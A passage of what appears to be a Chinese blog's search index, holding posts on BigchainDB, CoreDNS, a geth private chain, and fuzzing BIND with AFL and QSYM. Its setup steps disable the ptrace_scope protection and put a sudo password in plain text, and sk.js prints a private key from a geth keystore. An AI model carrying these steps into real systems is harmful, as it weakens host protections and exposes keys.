priority_queue&lt;pair&lt;int, int&gt;, vector&lt;pair&lt;int, int&gt;&gt;, greater&lt;pair&lt;int, int&gt;&gt;&gt; pq; pq.emplace(0, 0); while (!pq.empty() &amp;&amp; pq.top().first &lt;= maxMoves) { auto [step, u] = pq.top(); pq.pop(); if (visited.count(u)) { continue; } visited.emplace(u); reachableNodes++; for (auto [v, nodes] : adList[u]) { if (nodes + step + 1 &lt;= maxMoves &amp;&amp; !visited.count(v)) { pq.emplace(nodes + step + 1, v); } used[encode(u, v, n)] = min(nodes, maxMoves - step); } } for (auto &amp;edge : edges) { int u = edge[0], v = edge[1], nodes = edge[2]; reachableNodes += min(nodes, used[encode(u, v, n)] + used[encode(v, u, n)]); } return reachableNodes; }};","link":"/home/2022/11/28/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9320/"},{"title":"BigChain DB的安装与使用","text":"step1. 构建一个BigChainDB节点使用All-in-One Docker搭建 拉取镜像 1docker pull bigchaindb/bigchaindb:all-in-one 运行1234567891011docker run \\ --detach \\ --name bigchaindb \\ --publish 9984:9984 \\ --publish 9985:9985 \\ --publish 27017:27017 \\ --publish 26657:26657 \\ --volume $HOME/bigchaindb_docker/mongodb/data/db:/data/db \\ --volume $HOME/bigchaindb_docker/mongodb/data/configdb:/data/configdb \\ --volume $HOME/bigchaindb_docker/tendermint:/tendermint \\ bigchaindb/bigchaindb:all-in-one 使用Ansible一键脚本搭建什么是Ansible Playbooks Ansible Playbooks offer a repeatable, re-usable, simple configuration management and multi-machine deployment system, one that is well suited to deploying complex applications. If you need to execute a task with Ansible more than once, write a playbook and put it under source control. Then you can use the playbook to push out new configuration or confirm the configuration of remote systems. The playbooks in the ansible-examples repository illustrate many useful techniques. You may want to look at these in another tab as you read the documentation. 是一个为了便于多机搭建的工具 安装Ansible Playbooks1python3 -m pip install --user ansible 使用ansible安装BigChainDB 配置hosts中的all文件，使用basicconfig12# Basic configuration&lt;HOSTNAME&gt; ansible_ssh_user=tt ansible_sudo_pass=123456 voting_power=&lt;INT&gt; 1234docker run -itd -v /root/bigchaindb/bigchaindb-node-ansible:/home/bigchaindb-node-ansible -p 9983:9984 ubuntu /bin/bashansible-playbook install.yml -i hosts/all --extra-vars &quot;top_dir=$(pwd)&quot;# 或者使用python3 -m ansible playbook install.yml -i hosts/all --extra-vars &quot;top_dir=$(pwd)&quot; 官网的这个可能用不了，他的原理可能是通过ssh连接进行配置，我们需要后续建立一个ssh 后续可以自己搭建ansible Control Node达到多机搭建的作用 不使用docker 官方教程 以上三种方法任选其一就可以，第三种方法如果需要一个机器对应一个节点时再考虑。 step2. 建立网络编写docker compose文件1234567891011121314151617181920212223242526272829303132333435363738394041version: '2.1'services: mongodb: image: mongo:3.6 ports: - &quot;27017:27017&quot; command: mongod bigchaindb: image: bigchaindb/bigchaindb depends_on: - mongodb - tendermint environment: BIGCHAINDB_DATABASE_BACKEND: localmongodb BIGCHAINDB_DATABASE_HOST: mongodb BIGCHAINDB_DATABASE_PORT: 27017 BIGCHAINDB_SERVER_BIND: 0.0.0.0:9984 BIGCHAINDB_WSSERVER_HOST: 0.0.0.0 BIGCHAINDB_WSSERVER_ADVERTISED_HOST: bigchaindb BIGCHAINDB_TENDERMINT_HOST: tendermint BIGCHAINDB_TENDERMINT_PORT: 26657 ports: - &quot;9984:9984&quot; - &quot;9985:9985&quot; - &quot;26658:26658&quot; healthcheck: test: [&quot;CMD&quot;, &quot;bash&quot;, &quot;-c&quot;, &quot;curl http://bigchaindb:9984 &amp;&amp; curl http://tendermint:26657/abci_query&quot;] interval: 3s timeout: 5s retries: 3 #command: 'bigchaindb start' tendermint: image: tendermint/tendermint:0.22.8 volumes: - ./tmdata:/tendermint entrypoint: '' ports: - &quot;26656:26656&quot; - &quot;26657:26657&quot; command: sh -c &quot;tendermint init &amp;&amp; tendermint node --consensus.create_empty_blocks=false --proxy_app=tcp://bigchaindb:26658&quot; 使用tendermint生成配置文件1tendermint testnet 修改生成的配置文件，写入节点实际ip 启动1docker-compose up -d step3. 测试 使用postman发送测试Post交易 1234567891011121314151617181920212223242526272829303132333435363738{ &quot;asset&quot;: { &quot;data&quot;: { &quot;msg&quot;: &quot;Hello BigchainDB!&quot; } }, &quot;id&quot;: &quot;4957744b3ac54434b8270f2c854cc1040228c82ea4e72d66d2887a4d3e30b317&quot;, &quot;inputs&quot;: [ { &quot;fulfillment&quot;: &quot;pGSAIDE5i63cn4X8T8N1sZ2mGkJD5lNRnBM4PZgI_zvzbr-cgUCy4BR6gKaYT-tdyAGPPpknIqI4JYQQ-p2nCg3_9BfOI-15vzldhyz-j_LZVpqAlRmbTzKS-Q5gs7ZIFaZCA_UD&quot;, &quot;fulfills&quot;: null, &quot;owners_before&quot;: [ &quot;4K9sWUMFwTgaDGPfdynrbxWqWS6sWmKbZoTjxLtVUibD&quot; ] } ], &quot;metadata&quot;: { &quot;sequence&quot;: 0 }, &quot;operation&quot;: &quot;CREATE&quot;, &quot;outputs&quot;: [ { &quot;amount&quot;: &quot;1&quot;, &quot;condition&quot;: { &quot;details&quot;: { &quot;public_key&quot;: &quot;4K9sWUMFwTgaDGPfdynrbxWqWS6sWmKbZoTjxLtVUibD&quot;, &quot;type&quot;: &quot;ed25519-sha-256&quot; }, &quot;uri&quot;: &quot;ni:///sha-256;PNYwdxaRaNw60N6LDFzOWO97b8tJeragczakL8PrAPc?fpt=ed25519-sha-256&amp;cost=131072&quot; }, &quot;public_keys&quot;: [ &quot;4K9sWUMFwTgaDGPfdynrbxWqWS6sWmKbZoTjxLtVUibD&quot; ] } ], &quot;version&quot;: &quot;2.0&quot;} 查询交易 1http://localhost::9984/api/v1/assets/?search=Hello BigchainDB step4. bigchaindb_driver python的api 安装依赖123pip3 install --upgrade setuptoolssudo apt-get install python3-dev libssl-dev libffi-devpip3 install python-rapidjson PyNaCl 安装driver1pip3 install bigchaindb_driver 运行测试代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# import BigchainDB and create an objectfrom bigchaindb_driver import BigchainDBbdb_root_url = 'https://example.com:9984'bdb = BigchainDB(bdb_root_url)# generate a keypairfrom bigchaindb_driver.crypto import generate_keypairalice, bob = generate_keypair(), generate_keypair()# create a digital asset for Alicegame_boy_token = { 'data': { 'token_for': { 'game_boy': { 'serial_number': 'LR35902' } }, 'description': 'Time share token. Each token equals one hour of usage.', },}# prepare the transaction with the digital asset and issue 10 tokens for Bobprepared_token_tx = bdb.transactions.prepare( operation='CREATE', signers=alice.public_key, recipients=[([bob.public_key], 10)], asset=game_boy_token)# fulfill and send the transactionfulfilled_token_tx = bdb.transactions.fulfill( prepared_token_tx, private_keys=alice.private_key)bdb.transactions.send_commit(fulfilled_token_tx)# Use the tokens# create the output and inout for the transactiontransfer_asset = {'id': fulfilled_token_tx['id']}output_index = 0output = fulfilled_token_tx['outputs'][output_index]transfer_input = {'fulfillment': output['condition']['details'], 'fulfills': {'output_index': output_index, 'transaction_id': transfer_asset['id']}, 'owners_before': output['public_keys']}# prepare the transaction and use 3 tokensprepared_transfer_tx = bdb.transactions.prepare( operation='TRANSFER', asset=transfer_asset, inputs=transfer_input, recipients=[([alice.public_key], 3), ([bob.public_key], 7)])# fulfill and send the transactionfulfilled_transfer_tx = bdb.transactions.fulfill( prepared_transfer_tx, private_keys=bob.private_key)sent_transfer_tx = bdb.transactions.send_commit(fulfilled_transfer_tx)","link":"/home/2022/12/05/%E7%BB%84%E4%BC%9A/bigchainDB/"},{"title":"CoreDNS安装使用","text":"CoreDNS简介 是一个DNS服务器 支持插件 使用Go编写的 安装 预编译的可执行文件下载地址 Docker DockerHub-CoreDNS 源代码编译 安装很简单，下载解压可以得到一个coredns可执行文件 测试 启动服务 1./coredns -dns.port=1053 测试服务 1dig @localhost -p 1053 a whoami.example.org 以上命令均未报错，且coredns打印出了服务日志 插件 官方插件教程 可以通过实现以下go语言接口，使插件获取dns服务器的请求，进行处理并返回处理结果 1func (wh Whoami) ServeDNS(ctx context.Context, w dns.ResponseWriter, r *dns.Msg) (int, error) 补充知识 dig命令 dig(domain information group)是常用的域名查询工具，该工具可以从指定DNS服务器查询主机信息 1234567891011121314151617; &lt;&lt;&gt;&gt; DiG 9.18.1-1ubuntu1.2-Ubuntu &lt;&lt;&gt;&gt; @localhost -p 1053 a whoami.example.org; (1 server found);; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 32883;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 3;; WARNING: recursion requested but not available;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 1232; COOKIE: 83bd45262339483b (echoed);; QUESTION SECTION:;whoami.example.org. IN A;; ADDITIONAL SECTION:whoami.example.org. 0 IN A 127.0.0.1_udp.whoami.example.org. 0 IN SRV 0 0 41003 . dig 的查询时间 1234;; Query time: 0 msec;; SERVER: 127.0.0.1#1053(localhost) (UDP);; WHEN: Sun Jan 01 10:49:45 CST 2023;; MSG SIZE rcvd: 135 dig的参数 指定DNS查询记录 12345678dig www.baidu.com A # 查询A记录，如果域名后面不加任何参数，默认查询A记录dig www.baidu.com MX # 查询MX记录dig www.baidu.com CNAME # 查询CNAME记录dig www.baidu.com NS # 查询NS记录dig www.baidu.com ANY # 查询上面所有的记录dig www.baidu.com A +short # 查询A记录并显示简要的返回的结果dig www.baidu.com A +multiline # 查询A记录并显示详细的返回结果 指定dns服务器 1dig @DNS_SERVER_IP -p port www.baidu.com 只打印answer部分 1dig -p 1053 @localhost +noall +answer &lt;name&gt; &lt;type&gt; 其他信息 DNS记录类型 DNS记录类型包含：A记录、AAAA记录、CNAME记录、MX记录、NS记录、TXT记录、SRV记录、URL转发。对这些类型的记录解释如下： A记录 将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录 AAAA记录 将域名指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录 CNAME记录 将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录。这个域名一般是主机服务商提供的一个域名 MX记录 将域名指向一个邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录 NS记录 记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。 PTR记录 PTR记录是A记录的逆向记录，又称做IP反查记录或指针记录，负责将IP反向解析为域名 SRV记录 Service Record，用于指定服务器提供服务的位置（如主机名和端口）数据 在windows下访问dns服务器 在windows中使用dig命令进行试验，如果windows可以正常输出，且dns服务器可以打印相应的日志即可 Bind9 的安装 dig命令属于bind工具，官方提供了ftp服务器用于下载 使用dig命令 我使用的是wsl，首先在wsl中使用ifconfig找到wsl的ip地址，并使用下面的命令进行测试 1dig @172.23.208.1 -p 1053 www.baidu.com 观察到命令可以正常返回，dns服务器也打印出了相应的日志","link":"/home/2023/01/01/%E7%BB%84%E4%BC%9A/CoreDNS/"},{"title":"QSYM-afl-环境安装","text":"afl的安装 安装build-essentials和cmake github下载源码并解压 make make install usr/local/bin下有了编译好的afl工具 12345678910111213root@tt-HP:~/dns_env# find /usr/local/bin/afl*/usr/local/bin/afl-analyze/usr/local/bin/afl-clang/usr/local/bin/afl-clang++/usr/local/bin/afl-cmin/usr/local/bin/afl-fuzz/usr/local/bin/afl-g++/usr/local/bin/afl-gcc/usr/local/bin/afl-gotcpu/usr/local/bin/afl-plot/usr/local/bin/afl-showmap/usr/local/bin/afl-tmin/usr/local/bin/afl-whatsup qsym的安装 以下是安装方法12345678910# disable ptrace_scope for PIN$ echo 0|sudo tee /proc/sys/kernel/yama/ptrace_scope# install z3 and system deps$ ./setup.sh# install using virtual env$ virtualenv venv$ source venv/bin/activate$ pip install . 不用wsl用vm就不会有很多问题 ptrace置0可能是由于内核版本问题，/proc/sys/kernel/yama/ptrace_scope文件不存在，查到可以修改另一个文件 /etc/sysctl.d/10-ptrace.conf，添加或修改以下内容 1kernel.yama.ptrace_scope = 0 在setup.sh中会对这个/proc/sys/kernel/yama/ptrace_scope文件中的值是否为0进行判断，由于我没有，将脚本中这几行删掉 1234if ! grep -qF &quot;0&quot; /proc/sys/kernel/yama/ptrace_scope; then echo &quot;Please run 'echo 0|sudo tee /proc/sys/kernel/yama/ptrace_scope'&quot; exit -1fi 子模块下载问题安装过程中发现git submodule下载不下来，使用递归的方式重新clone 1git clone https://github.com/sslab-gatech/qsym.git --recursive 在setup.sh把git submodule 去掉 12git submodule initgit submodule update 配置PYTHON环境变量观察到setup.sh中，get-pip时需要使用python2环境，提示需要PYTHON环境变量 12echo export PYTHON=$(echo $(whereis python2) | awk '{split($0, arr, &quot; &quot;); print arr[2]}') | tee -a ~/.bashrc source ~/.bashrc 找不到bits/*.h 安装multilib123sudo add-apt-repository ppa:ubuntu-toolchain-r/testsudo apt-get updatesudo apt-get install -y g++-multilib 安装virtualenv123sudo apt-get install virtualenv# orpip install virtualenv 安装lsb 进行pip install .时可能报错make: lsb_release: Command not found，安装lsb既可 1sudo apt install lsb-core 最终在vm的ubuntu 16.04下成功进行了安装，python环境是python3.7.9（ubuntu 16.04需要下载python3.7源码编译安装）（python2环境也成功了，其实不应该安装python3，整个项目都应该运行在python2环境下） 运行测试123cd testspython build.pypython -m pytest -n $(nproc) requirements pip install python-afl 运行结果 1234567891011(venv) tt@ubuntu:~/Desktop/dns/qsym/tests$ python -m pytest -n $(nproc)============================= test session starts ==============================platform linux2 -- Python 2.7.12, pytest-4.6.11, py-1.11.0, pluggy-0.13.1rootdir: /home/tt/Desktop/dns/qsymplugins: forked-1.3.0, xdist-1.34.0gw0 [250] / gw1 [250] / gw2 [250] / gw3 [250]........................................................................ [ 28%]........................................................................ [ 57%]........................................................................ [ 86%].................................. [100%]======================================================================================= 250 passed in 565.71 seconds ======================================================================================= 使用docker安装qsym12345678# disable ptrace_scope for PIN$ echo 0|sudo tee /proc/sys/kernel/yama/ptrace_scope# build docker image$ docker build -t qsym ./# run docker image$ docker run --cap-add=SYS_PTRACE -it qsym /bin/bash 错误1 ERROR [internal] load metadata for docker.io/library/ubuntu:16.04 在docker中的daemon.json中修改buildkit为false 1&quot;features&quot;: { &quot;buildkit&quot;: false } ptrace置0 使用docker时，build时的ubuntu镜像也没有这个/proc/sys/kernel/yama/ptrace_scope文件。setup.sh中将脚本中这几行删掉1234if ! grep -qF &quot;0&quot; /proc/sys/kernel/yama/ptrace_scope; then echo &quot;Please run 'echo 0|sudo tee /proc/sys/kernel/yama/ptrace_scope'&quot; exit -1fi 最终的dockerfile1234567891011121314151617181920212223242526272829303132333435363738FROM ubuntu:16.04RUN mv /etc/apt/sources.list /etc/apt/sources.list.bakRUN echo deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse &gt;&gt;/etc/apt/sources.listRUN echo deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse &gt;&gt;/etc/apt/sources.listRUN echo deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse &gt;&gt;/etc/apt/sources.listRUN echo deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse &gt;&gt;/etc/apt/sources.listRUN echo deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse &gt;&gt;/etc/apt/sources.list# jingtianer: 国内源RUN apt-get updateRUN apt-get install -y git build-essential sudo pythonRUN mkdir -p /workdir/qsymWORKDIR /workdir/qsymRUN apt-get install -y lsb-coreRUN apt-get install -y libc6 libstdc++6 linux-libc-dev gcc-multilib g++-multilib \\ llvm-dev g++ g++-multilib python \\ lsb-releaseRUN apt-get install -y gcc make python-pipCOPY . /workdir/qsymRUN ./setup.shRUN python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple --upgrade pipRUN pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple# jingtianer: pip清华源# RUN echo kernel.yama.ptrace_scope = 0 | sudo tee /etc/sysctl.d/10-ptrace.conf# jingtianer: ptrace置为0RUN pip install .RUN pip install python-afl# jingtianer: test需要的依赖包 docker 方式在ubuntu22.04中配置安装，但是不能成功运行测试代码 两种方法都无法在wsl中使用，缺少文件夹/proc/sys/kernel/yama两种方法在编译时都存在warnings","link":"/home/2023/01/07/%E7%BB%84%E4%BC%9A/QSYM-afl-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"},{"title":"geth搭建私链","text":"主要工作参考go-ethereum官网的Private Networks文档搭建了一个私有链，并总结出几个脚本，可以半自动化地实现geth网络的搭建，脚本已上传至github仓库DLCCB setup.sh 这一步使用了以下几个工具 geth命令，用于生成初始两个节点的账户，使用创世块配置文件对两个账户进行初始化 puppeth 用于生成创世块的配置文件，这个命令是交互式的，编写了一个puppeth.txt作为其输入，默认生成一个基于pow的区块链 bootnode 用于生成启动bootnode 这一步使用了以下几个linux命令 sed 非交互式的文本编辑器，用于读取生成的账户的区块链地址，写入puppeth.txt中，使得puppeth工具能为初始的两个节点分配一定的以太币 awk，用于对文本的处理 setup.sh123456789101112131415161718mkdir node1 node2geth --datadir node1 account new &lt; password.txtgeth --datadir node2 account new &lt; password.txtsed -i &quot;5i$(cat node1/keystore/UTC--* | awk '{split($0, arr, &quot;\\&quot;&quot;); print arr[4]}')&quot; puppeth.txt sed -i &quot;5i$(cat node2/keystore/UTC--* | awk '{split($0, arr, &quot;\\&quot;&quot;); print arr[4]}')&quot; puppeth.txt puppeth &lt; puppeth.txtsed -i &quot;5d&quot; puppeth.txtsed -i &quot;5d&quot; puppeth.txtgeth init --datadir node1 tianer.jsongeth init --datadir node2 tianer.jsoncat password.txt | head -n 1 | tee node1/password.txtcat password.txt | head -n 1 | tee node2/password.txtbootnode -genkey boot.keybootnode -nodekey boot.key -addr :30305 两个输入文件的内容password.txt1212345678901234567890 这里两个节点的密码是相同的，也可以单独为每个节点写一个密码文件，但是密码文件必须两行相同，因为创建账户时需要输入两次密码 puppeth.txt123456789101112tianer211yes123452223 从上到下依次对配置创世块的配置文件进行创建，导出保存，删除。会使用sed命令在第五行临时插入刚刚生成的账户文件的区块链地址，这样puppeth命令就知道要给哪些地址分配初始的以太币 sed命令sed 命令是一个面向行处理的工具，它以“行”为处理单位，针对每一行进行处理，处理后的结果会输出到标准输出（STDOUT）。你会发现 sed 命令是很懂礼貌的一个命令，它不会对读取的文件做任何贸然的修改，而是将内容都输出到标准输出中。 基本用法 1sed [选项] &quot;指令&quot; 文件 选项，如果希望sed命令对文件直接进行更改，需要添加-i参数， 以下是几个查那个用的参数 -e –它告诉sed将下一个参数解释为一个sed指令，只有当命令行上给出多个sed指令时使用 -f –后跟保存了sed指令的文件 -i –直接对内容进行修改，不加 i 时默认只是预览，不会对文件进行实际修改 -n –取消默认输出，sed默认会输出所有文本内容，使用 -n 参数后只显示处理过的行 指令，类似vim，sed也有编辑命令 a –追加，向匹配行后插入内容 c –更改，更改匹配行的内容 i –插入，向匹配行前插入内容 d –删除，删除匹配的内容 s –替换，替换匹配到的内容 p –打印，打印匹配到的内容，通常与 -n 和用 = –用来打印被匹配到的行的行号 n –读取下一行，遇到n时会自动跳入下一行 r,w –读和写，r用于将内容读入文件，w用于将匹配内容写入到文件 其中s命令后跟正则串和目标串，可以起到文本的匹配替换sed的指令使用/作为定界符，转义符为\\ 例子： 1234sed -i 's/book/books/' filesed -i 's/book/books/g' file # 后缀g对每行的所有匹配进行替换sed -i '2d' file #删除指定行sed -i '5ixxxxx' file #在指定行插入xxxxx 具体可以参考这里 awk命令AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。之所以叫 AWK 是因为其取了三位创始人 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 的 Family Name 的首字符linux中有三剑客之称：三剑客之首就是 AWK三剑客功能:grep ： 过滤文本sed : 修改文本awk : 处理文本 语法格式 1awk [参数] [处理内容] [操作对象] 具体可以参考这里 mine.sh用于启动创建的两个节点 mine.sh12345678NODE=$2ENODE=$1AUTHRPCPORT=$(($2+8554))PORT=$(($2+30308))echo geth --datadir node$NODE --port $PORT --bootnodes $ENODE --networkid 12345 --unlock 0x$(cat node$NODE/keystore/UTC--* | awk '{split($0, arr, &quot;\\&quot;&quot;); print arr[4]}') --password node1/password.txt --authrpc.port $AUTHRPCPORTgeth --datadir node$NODE --port $PORT --bootnodes $ENODE --networkid 12345 --unlock 0x$(cat node$NODE/keystore/UTC--* | awk '{split($0, arr, &quot;\\&quot;&quot;); print arr[4]}') --password node1/password.txt --authrpc.port $AUTHRPCPORT --mine 前一个脚本执行后，会输出enode， 将其复制下来，打开两个新的terminal窗口，enode作为这个脚本的第一个参数，第二个参数是希望启动的节点的编号 attach.sh用于让两个节点开始挖矿，使用geth attach打开js交互界面，miner.txt作为输入文件，执行命令miner.start(1)开始挖矿 attach.sh123NODE=$1echo geth attach node$NODE/geth.ipcgeth attach node$NODE/geth.ipc &lt; miner.txt 参数为希望开始挖矿的节点编号，也需要打开新的terminal执行 miner.txt123net.peerCounteth.getBalance(eth.accounts[0])miner.start(1) sk.js用于获取节点的私钥，在开发时私钥很重要 sk.js1234567var keythereum = require(&quot;keythereum&quot;);var datadir = &quot;/home/tt/eth/net/node2/&quot;;var address= &quot;e43b98ac32beb344c94b15b9af5b46674d6c3e6d&quot;;//要小写const password = &quot;1234567890&quot;;var keyObject = keythereum.importFromFile(address, datadir);var privateKey = keythereum.recover(password, keyObject);console.log(privateKey.toString('hex')); 需要节点的datadir和节点的address","link":"/home/2023/01/10/misc/geth%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%93%BE/"},{"title":"QSYM-afl-环境安装","text":"使用afl对bind进行编译 希望使用afl对bind进行编译 通过./configure -help知道，需要配置下面几个环境变量，达到替换编译器的目的 12export CC='afl-gcc'export CXX='afl-g++' 对bind进行编译 123./configuresudo makesudo make install 使用qsym进行测试（结合MOPT-FAST） 使用正常的gcc编译bind，将生成的named复制到test/uninstrumented下 （运行qsym需要） 使用afl-gcc编译bind，将生成的named复制到test/instrumented下 （运行afl-fuzz的master和slave需要） 选取MOPT-FAST中的一个测试用例，复制到test/testcase_dir 按照qsym文档的顺序依次启动master，slave和qsym，命令如下 123456afl-fuzz -m 4096 -M afl-master -i testcase_dir/ -o finding_dir/ -- ./instrumented/namedafl-fuzz -m 4096 -S afl-slave -i testcase_dir/ -o finding_dir/ -- ./instrumented/named# 打开qsym环境source ../qsym/venv/bin/activate../qsym/bin/run_qsym_afl.py -a afl-slave -o finding_dir/ -n qsym -- ./uninstrumented/named 问题1 报错 Pipe at the beginning of ‘core_pattern’ 1echo core | sudo tee /proc/sys/kernel/core_pattern 之前我们创建了一个virtualenv，这次运行第三个命令时，也要先进入这个环境中 master输出 1234567891011121314151617181920212223242526 american fuzzy lop 2.57b (afl-master)┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐│ run time : 0 days, 0 hrs, 0 min, 59 sec │ cycles done : 0 ││ last new path : 0 days, 0 hrs, 0 min, 2 sec │ total paths : 15 ││ last uniq crash : none seen yet │ uniq crashes : 0 ││ last uniq hang : none seen yet │ uniq hangs : 0 │├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤│ now processing : 0 (0.00%) │ map density : 7.53% / 7.59% ││ paths timed out : 0 (0.00%) │ count coverage : 1.01 bits/tuple │├─ stage progress ────────────────────┼─ findings in depth ────────────────────┤│ now trying : havoc │ favored paths : 1 (6.67%) ││ stage execs : 2533/16.4k (15.46%) │ new edges on : 13 (86.67%) ││ total execs : 3608 │ total crashes : 0 (0 unique) ││ exec speed : 50.36/sec (slow!) │ total tmouts : 4 (4 unique) │├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤│ bit flips : 1/32, 0/31, 0/29 │ levels : 2 ││ byte flips : 0/4, 0/3, 0/1 │ pending : 15 ││ arithmetics : 1/224, 0/25, 0/0 │ pend fav : 1 ││ known ints : 0/25, 0/84, 0/44 │ own finds : 14 ││ dictionary : 0/0, 0/0, 0/0 │ imported : 0 ││ havoc : 0/0, 0/0 │ stability : 97.85% ││ trim : n/a, 0.00% ├────────────────────────┘└─────────────────────────────────────────────────────┘ [cpu000:168%] slave 输出 123456789101112131415161718192021222324 american fuzzy lop 2.57b (afl-slave)┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐│ run time : 0 days, 0 hrs, 0 min, 33 sec │ cycles done : 0 ││ last new path : 0 days, 0 hrs, 0 min, 4 sec │ total paths : 14 ││ last uniq crash : none seen yet │ uniq crashes : 0 ││ last uniq hang : none seen yet │ uniq hangs : 0 │├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤│ now processing : 0 (0.00%) │ map density : 7.53% / 7.58% ││ paths timed out : 0 (0.00%) │ count coverage : 1.49 bits/tuple │├─ stage progress ────────────────────┼─ findings in depth ────────────────────┤│ now trying : havoc │ favored paths : 1 (7.14%) ││ stage execs : 1163/4096 (28.39%) │ new edges on : 11 (78.57%) ││ total execs : 1700 │ total crashes : 0 (0 unique) ││ exec speed : 50.70/sec (slow!) │ total tmouts : 12 (8 unique) │├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤│ bit flips : n/a, n/a, n/a │ levels : 2 ││ byte flips : n/a, n/a, n/a │ pending : 14 ││ arithmetics : n/a, n/a, n/a │ pend fav : 1 ││ known ints : n/a, n/a, n/a │ own finds : 13 ││ dictionary : n/a, n/a, n/a │ imported : 0 ││ havoc : 0/0, 0/0 │ stability : 53.47% ││ trim : n/a, n/a ├────────────────────────┘└─────────────────────────────────────────────────────┘ [cpu001:166%] qsym 输出 1234567891011121314(venv) tt@ubuntu:~/Desktop/dns/test$ ../qsym/bin/run_qsym_afl.py -a afl-slave -o finding_dir/ -n qsym -- ./uninstrumented/namedDEBUG:qsym.afl:Temp directory=/tmp/tmpvbo369DEBUG:qsym.afl:Run qsym: input=finding_dir/afl-slave/queue/id:000037,src:000005,op:havoc,rep:2,+covDEBUG:qsym.Executor:Executing timeout -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmpvbo369/qsym-out-0/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmpvbo369/qsym-out-0 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/namedDEBUG:qsym.afl:Total=13 s, Emulation=13 s, Solver=0 s, Return=-4DEBUG:qsym.afl:Generate 0 testcasesDEBUG:qsym.afl:0 testcases are newDEBUG:qsym.afl:Run qsym: input=finding_dir/afl-slave/queue/id:000032,src:000005,op:havoc,rep:16,+covDEBUG:qsym.Executor:Executing timeout -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmpvbo369/qsym-out-1/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmpvbo369/qsym-out-1 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/namedDEBUG:qsym.afl:Total=9 s, Emulation=9 s, Solver=0 s, Return=-4DEBUG:qsym.afl:Generate 0 testcasesDEBUG:qsym.afl:0 testcases are newDEBUG:qsym.afl:Run qsym: input=finding_dir/afl-slave/queue/id:000024,src:000005,op:havoc,rep:128,+covDEBUG:qsym.Executor:Executing timeout -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmpvbo369/qsym-out-2/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmpvbo369/qsym-out-2 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named 总结 qsym结合mopt对bind的dns服务器进行了测试，afl总共跑了1 days, 11 hrs, 53 min, 22 sec, 并没有生成任何testcase 每次输出总伴随这个这个timeout，不知道是什么问题 1DEBUG:qsym.Executor:Executing timeout -k 5 90 /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/../../../../third_party/pin-2.14-71313-gcc.4.4.7-linux/pin.sh -ifeellucky -t /home/tt/Desktop/dns/qsym/venv/lib/python2.7/site-packages/qsym/pintool/obj-intel64/libqsym.so -logfile /tmp/tmphuJKne/qsym-out-262/pin.log -i /home/tt/Desktop/dns/test/finding_dir/qsym/.cur_input -s 1 -o /tmp/tmphuJKne/qsym-out-262 -l 1 -b finding_dir/qsym/bitmap -- ./uninstrumented/named 查看了很多issue，发现上传的日志中大家也都有timeout","link":"/home/2023/01/11/%E7%BB%84%E4%BC%9A/qsym%E5%AF%B9bind%E6%B5%8B%E8%AF%95/"},{"title":"DNS第五周文献阅读","text":"Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guidedabstract在本研究中，我们发现种子之间的关系对于种子调度是有价值的。我们通过研究和利用种子之间的变异关系，设计并提出了一个”种子变异树”。利用”种子变异树”，我们进一步将种子调度问题建模为蒙特卡洛树搜索( MCTS )问题。即在MCTS估计的基础上，通过最优路径遍历”种子变异树”，选择下一个种子进行模糊处理。 